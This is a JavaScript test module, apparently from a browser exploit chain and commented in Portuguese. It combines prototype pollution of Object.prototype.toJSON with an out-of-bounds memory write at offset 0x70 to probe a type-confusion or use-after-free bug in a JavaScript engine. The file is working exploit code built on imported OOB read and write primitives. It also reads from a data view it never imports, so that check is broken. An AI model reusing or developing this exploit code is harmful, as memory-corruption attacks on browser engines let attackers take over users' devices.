// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const TEST_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKeyToPollute: 'toJSON',
};

// Contador global para chamadas ao toJSON, pode ser útil para algumas lógicas de toJSON
export let globalCallCount_toJSON = 0;

export async function executePPThenOOBWriteTest(
    testVariantDescription,
    toJSONFunctionLogic // A função que será usada como Object.prototype.toJSON
) {
    const FNAME_TEST = `executePPThenOOBWrite<${testVariantDescription}>`;
    const {
        victim_ab_size,
        corruption_offset,
        value_to_write,
        bytes_to_write_for_corruption,
        ppKeyToPollute,
    } = TEST_PARAMS;

    logS3(`--- Iniciando Teste (PP then OOB Write): ${testVariantDescription} ---`, "test", FNAME_TEST);
    logS3(`   Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}`, "info", FNAME_TEST);
    document.title = `Iniciando: ${testVariantDescription}`;

    globalCallCount_toJSON = 0; // Resetar contador
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return;
    }
    document.title = "OOB Configurado";

    // Criar uma vítima ArrayBuffer (não será usada com JSON.stringify neste teste)
    // A sua existência pode influenciar o layout do heap.
    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado (não usado diretamente com stringify).`, "info", FNAME_TEST);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
    let pollutionAppliedThisRun = false;
    let stepReached = "antes_pp";
    let potentiallyFroze = true; // Assumir congelamento até prova em contrário

    try {
        logS3(`Tentando poluir Object.prototype.${ppKeyToPollute} com lógica: ${testVariantDescription}`, "info", FNAME_TEST);
        document.title = `Aplicando PP: ${testVariantDescription}`;
        stepReached = "aplicando_pp";

        Object.defineProperty(Object.prototype, ppKeyToPollute, {
            value: toJSONFunctionLogic, // Usa a lógica fornecida
            writable: true, configurable: true, enumerable: false
        });
        pollutionAppliedThisRun = true;
        logS3(`Object.prototype.${ppKeyToPollute} poluído.`, "good", FNAME_TEST);
        stepReached = "pp_aplicada";
        document.title = `PP Aplicada: ${testVariantDescription}`;

        // Escrita OOB (PONTO CRÍTICO PARA CONGELAMENTO)
        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
        stepReached = "antes_escrita_oob";
        document.title = `Antes Escrita OOB: ${testVariantDescription}`;

        oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
        
        // Se chegou aqui, a escrita OOB em si não congelou imediatamente.
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita OOB: ${testVariantDescription}`;
        potentiallyFroze = false; // Não congelou na escrita OOB

        // Teste adicional opcional: Tentar usar a oob_dataview_real para ver se a primitiva ainda funciona
        try {
            let testRead = oob_dataview_real.getUint32(0, true);
            logS3(`Leitura de controle da oob_dataview_real (offset 0) APÓS OOB write: ${toHex(testRead)}`, "good");
            document.title = `Leitura DV OK: ${testVariantDescription}`;
        } catch (e_dv) {
            logS3(`ERRO ao ler oob_dataview_real após OOB write: ${e_dv.message}`, "error");
            document.title = `ERRO Leitura DV: ${testVariantDescription}`;
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal: ${testVariantDescription}`;
        potentiallyFroze = false;
        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        if (pollutionAppliedThisRun) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKeyToPollute];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
        if (potentiallyFroze) {
            logS3(`O TESTE PODE TER CONGELADO DURANTE/APÓS A ESCRITA OOB. Último passo logado: ${stepReached}`, "warn", FNAME_TEST);
            document.title = `CONGELOU? Passo: ${stepReached} - ${testVariantDescription}`;
        }
    }
    logS3(`--- Teste (PP then OOB Write) Concluído: ${testVariantDescription} ---`, "test", FNAME_TEST);
    if (!potentiallyFroze) {
        document.title = `Teste Concluído Sem Congelamento na Escrita OOB: ${testVariantDescription}`;
    }
}
